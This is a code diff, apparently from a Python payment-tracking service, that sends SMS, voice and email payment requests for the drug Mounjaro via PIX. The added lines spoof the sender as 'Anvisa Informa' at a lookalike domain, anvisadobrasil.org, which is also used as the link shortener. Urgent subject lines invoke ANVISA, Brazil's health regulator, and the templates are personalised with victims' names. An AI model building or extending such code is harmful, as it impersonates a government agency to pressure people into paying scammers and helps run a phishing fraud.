@@ -241,8 +241,14 @@ def _send_initial_payment_sms_async(transaction_id, customer_data):
             request_data['email'] = email
             request_data['emailSubject'] = 'ANVISA: Seu PIX para Mounjaro Está Pronto! Pague Agora'
             request_data['emailTemplate'] = email_template
-            
-            logger.info(f"[PAYMENT_TRACKER][ASYNC] Added email parameters for {email}")
+            request_data['emailSenderName'] = 'Anvisa Informa'
+            request_data['emailSenderAddress'] = "noreply@anvisadobrasil.org"
+            # Adicionar variáveis para o template de e-mail
+            request_data['variables'] = {
+                'firstName': first_name,
+                'fullName': customer_name
+            }
+            logger.info(f"[PAYMENT_TRACKER][ASYNC] Added email parameters for {email} with variables: {{'firstName': '{first_name}', 'fullName': '{customer_name}'}}")
         
         logger.info(f"[PAYMENT_TRACKER][ASYNC] SMS request data: {request_data}")
         
@@ -334,7 +340,7 @@ def _send_reminder_sms_async(transaction_id, customer_data):
     if not phone_number.startswith('55'):
         phone_number = '55' + phone_number.lstrip('+')
     
-    # HTML template for email
+    # HTML template for email - mesmo template para mensagem inicial e lembrete
     email_template = """<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>PIX Gerado para Mounjaro</title>
@@ -438,17 +444,7 @@ def _send_reminder_sms_async(transaction_id, customer_data):
             'shortenerDomain': "anvisadobrasil.org",
             'voiceApiUrl': "https://v1.call4u.com.br/api/integrations/add/5a1e3a5aede16d438c38862cac1a78db/default"
         }
-        
-        # Adicionar parâmetros de e-mail conforme solicitado
-        if email:
-            # Adicionar suporte a e-mail
-            request_data['enableEmail'] = True
-            request_data['email'] = email
-            request_data['emailSubject'] = 'ANVISA: Seu PIX para Mounjaro Está Pronto! Pague Agora'
-            request_data['emailTemplate'] = email_template
-            
-            logger.info(f"[PAYMENT_TRACKER][ASYNC] Added email parameters for {email}")
-        
+  
         logger.info(f"[PAYMENT_TRACKER][ASYNC] Reminder SMS request data: {request_data}")
         
         # Send SMS via the API
